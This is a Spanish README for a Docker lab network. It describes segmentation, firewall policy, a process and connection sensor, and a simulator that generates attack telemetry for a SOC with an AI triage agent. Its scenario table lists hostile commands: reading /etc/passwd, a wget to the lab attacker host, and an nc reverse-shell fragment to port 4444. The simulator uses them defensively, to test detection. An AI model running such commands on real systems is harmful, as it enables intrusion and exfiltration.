# Red del laboratorio

Cuatro segmentos unidos por un único router que aplica la política de firewall.
Todo corre en Docker, en la notebook y sin Internet.

```
                         ┌────────────────────────┐
   externo 10.99.0.0/24  │         router         │  gestion 10.10.0.0/24
   ─ atacante .66 ───────┤ .254              .254 ├─────── ansible .10, espejo .5
                         │                        │
   servicios 10.20.0.0/24│      iptables          │  soc 10.30.0.0/24
   ─ web-01 .11 ─────────┤ .254  (reglas.v4) .254 ├─────── ingesta .10, agente .20,
     api-01 .12          │  contención :9000      │        respondedor .30, deteccion .40,
     db-01  .13          └────────────────────────┘        analista .50
```

## Cómo usarla

Desde `demo/`:

```bash
./preparar.sh                  # una sola vez: genera .env con tokens aleatorios
docker compose up -d --build   # levanta todo (la primera vez construye las imágenes)
./red/verificar.sh             # 31 pruebas de rutas, conectividad y segmentación
docker compose down            # la baja
```

Para probar a mano desde un contenedor:

```bash
docker compose exec -u nodo web-01 probar 10.30.0.10 8081   # abierto | rechazado | bloqueado
docker compose exec router iptables -L -v -n                # reglas y contadores
```

## Política

Tabla 1: tráfico permitido entre segmentos. Todo lo demás se descarta.

| Origen | Destino | Puerto | Para qué |
|--------|---------|--------|----------|
| gestion | servicios, soc | TCP 22, ICMP | Administración (Ansible, SSH) |
| servicios | espejo `10.10.0.5` | TCP 80 | Paquetes y firmas |
| servicios | ingesta `10.30.0.10` | TCP 8081 | Telemetría hacia el SOC |
| externo | web-01 `10.20.0.11` | TCP 80 | El único servicio publicado |

- El SOC **no inicia conexiones** hacia otros segmentos. Para contener actúa sobre
  el propio router, con la cadena `MINISOC-CONTENCION`, que se evalúa antes que todo
  lo demás y corta también las conexiones ya establecidas. Solo el respondedor llega
  al servicio de contención (`10.30.0.254:9000`). Ver [`../respondedor/`](../respondedor/README.md).
- La cadena `MINISOC-DENEGADO` es la última. Sus contadores muestran cuánto tráfico
  frenó la segmentación y Prometheus los puede leer.
- Las reglas usan subredes, no nombres de interfaz, porque Docker no garantiza en qué
  orden conecta las redes al contenedor.

## Sin salida a Internet

Hay tres capas:

1. Las redes no hacen NAT hacia afuera (`enable_ip_masquerade: false`).
2. Cada nodo usa al router como ruta por defecto, no al bridge de Docker.
3. El router borra su propia ruta por defecto y solo conoce los cuatro segmentos.

Además, cada nodo y el router bloquean la `.1` de su segmento con una ruta
`prohibit`. Esa IP es el bridge de Docker, o sea el host, y como está en la misma
subred el router no la ve.

**Por qué no usamos redes `internal`:** Docker descarta en ellas los paquetes cuyo
origen o destino es de otra subred, y eso es justamente lo que hace un router. Con
`internal: true` el router no recibe nada.

## Endurecimiento de los contenedores

- `cap_drop: ALL`. El router solo tiene `NET_ADMIN` y `NET_RAW`.
- Los nodos tienen `NET_ADMIN` solo para fijar sus rutas al arrancar. Después el
  servicio corre como el usuario `nodo` (uid 10001) y pierde la capability: no puede
  cambiar su ruta para salir por otro lado (`verificar.sh` no lo prueba, pero se
  puede ver con `docker compose exec -u nodo web-01 ip route replace default via
  10.20.0.1`, que falla con `Operation not permitted`).
- Filesystem de solo lectura, `no-new-privileges` y ningún puerto publicado en el host.

## Telemetría: el sensor

Cada servicio monitoreado (`web-01`, `api-01` y `db-01`) corre `nodo/sensor.py` junto
al servicio, como el mismo usuario sin privilegios. Mira solo su propio contenedor:

- **Procesos:** cada proceso nuevo, con su padre, su línea de comando y su usuario.
  Si un proceso cambia de programa (`exec`), se reporta otra vez con `"exec": true`.
- **Conexiones TCP:** entrantes y salientes. Una conexión que el router descarta queda
  en `syn_enviado`, y también se reporta: un intento bloqueado es evidencia.

Los eventos salen en lotes, cada 1 s, hacia la ingesta (`POST 10.30.0.10:8081/v1/eventos`).
Es el único tráfico que el firewall deja pasar de servicios al SOC. Si la ingesta no
responde, los eventos quedan en memoria y se reintenta.

Cada servicio corre con el nombre del proceso que representa (`php-fpm`, `node` o
`postgres`, variable `PROCESO`), así la telemetría lo ve como en producción.

Con `SENSOR_DEBUG=1`, que está activo por defecto, cada evento también aparece en
`docker compose logs web-01`. Un ejemplo:

```json
{"ts": "2026-11-14T18:20:03.512Z", "host": "web-01", "tipo": "proceso",
 "datos": {"pid": 412, "ppid": 405, "proceso": "sh", "padre": "php-fpm",
           "cmdline": "sh -c id; sleep 1; true", "usuario": "nodo"}}
{"ts": "2026-11-14T18:20:06.731Z", "host": "web-01", "tipo": "conexion",
 "datos": {"direccion": "saliente", "ip_origen": "10.20.0.11", "puerto_origen": 55732,
           "ip_destino": "10.99.0.66", "puerto_destino": 80, "estado": "syn_enviado"}}
```

Las IPs siempre van en campos propios (`ip_origen` / `ip_destino`) y no solo dentro de
un texto, como pide el contrato del agente para que se pueda proponer `bloquear_ip`.

## Simulador de escenarios

`./simular.sh` (desde `demo/`) genera la telemetría de un ataque o de una tarea normal.
**No explota nada:** corre dentro del contenedor, toma el nombre del proceso que haría
eso en producción y lanza los mismos comandos que se verían en un incidente real.

Tabla 2: escenarios del simulador.

| Escenario | Host | Etiqueta | Técnica | Qué deja en la telemetría |
|-----------|------|----------|---------|---------------------------|
| `webshell` | web-01 | malicioso | T1059, T1105 | `php-fpm` → `sh -c id`, `uname -a`, `cat /etc/passwd`, `wget` a 10.99.0.66 (bloqueado) |
| `reverse-shell` | api-01 | malicioso | T1059 | `node` → `sh -c ... nc 10.99.0.66 4444` (bloqueado) |
| `movimiento-lateral` | web-01 | malicioso | T1021 | `php-fpm` → `nc 10.20.0.13 22`; db-01 ve la conexión entrante |
| `actualizacion` | web-01 | benigno | T1105 | `cron` → `wget` al espejo interno 10.10.0.5 |
| `firmas` | db-01 | benigno | T1105 | `cron` → `wget` de firmas al espejo interno |

Los dos benignos usan la misma técnica (T1105, descarga de archivos) que el webshell
a propósito: una regla que solo mire "alguien descargó algo" va a disparar en los tres,
y tienen que ser la correlación y el agente los que separen lo normal de lo malicioso.

Probé los cinco escenarios tres veces cada uno. Las 11 evidencias clave (cada
`sh -c`, cada conexión bloqueada, los dos extremos del SSH lateral) aparecieron en
todas las corridas.

## Limitaciones

- **Dentro de un segmento no hay filtrado.** `web-01` y `api-01` se hablan
  directamente por L2, sin pasar por el router. Para separarlos haría falta
  microsegmentación (un firewall en cada host o políticas de red tipo Cilium).
- **`aislar_host` corta al host en el router,** o sea hacia otros segmentos. Dentro
  de su propio segmento sigue alcanzable, por la misma razón.
- **Los paquetes descartados no se loguean uno por uno.** Dentro de un contenedor el
  `LOG` de iptables no llega a ningún lado. Por ahora se usan los contadores. Para
  mandar cada descarte a la ingesta haría falta `NFLOG` + `ulogd`.
- **Los servicios son marcadores de lugar:** `escuchar.py` responde en los puertos
  de cada servicio y mantiene la conexión abierta como lo haría el servicio real.
- **El sensor funciona por muestreo** (cada 50 ms). Un proceso que vive menos que
  eso puede no verse: un `sh -c id` suelto dura milisegundos. Por eso los comandos
  del simulador terminan en `; sleep 1; true`, que mantiene vivo al shell. Un sensor
  eBPF (Falco, Tetragon) ve cada `exec` sin perder ninguno, pero necesita privilegios
  sobre el kernel del host, que en este laboratorio preferimos no dar.
- **`docker compose exec` queda fuera del sensor:** lo que se lanza desde afuera del
  contenedor es el canal de administración del laboratorio. Los procesos hijos sí se
  reportan, y por eso el simulador aparece como `php-fpm` y no como `simular`.

## Archivos

| Archivo | Qué hace |
|---------|----------|
| `../docker-compose.yml` | Segmentos, direcciones y contenedores |
| `router/reglas.v4` | Política de firewall (formato `iptables-restore`) |
| `router/entrypoint.sh` | Carga las reglas y saca la ruta por defecto del router |
| `nodo/entrypoint.sh` | Fija el gateway, bloquea el host y deja de ser root |
| `nodo/probar.py` | `probar IP PUERTO`: abierto, rechazado o bloqueado |
| `nodo/sensor.py` | Sensor de procesos y conexiones de cada servicio |
| `nodo/simular.py` | Escenarios de ataque y benignos (sin exploits) |
| `../simular.sh` | Corre un escenario en el contenedor que corresponde |
| `verificar.sh` | Corre todas las pruebas y muestra los contadores |
| `../ingesta/` | La ingesta: recibe, valida, normaliza y guarda los eventos (ver su README) |
| `../deteccion/` | Detección (reglas MITRE) y correlación de incidentes hacia el agente (ver su README) |
| `router/contencion.py` | Servicio de contención: la única forma de que el SOC cambie la red |
| `../respondedor/` | Aplica en el router las acciones que aprobó el analista (ver su README) |
| `../preparar.sh`, `../revertir.sh` | Genera los tokens en `.env`; muestra o revierte contenciones |
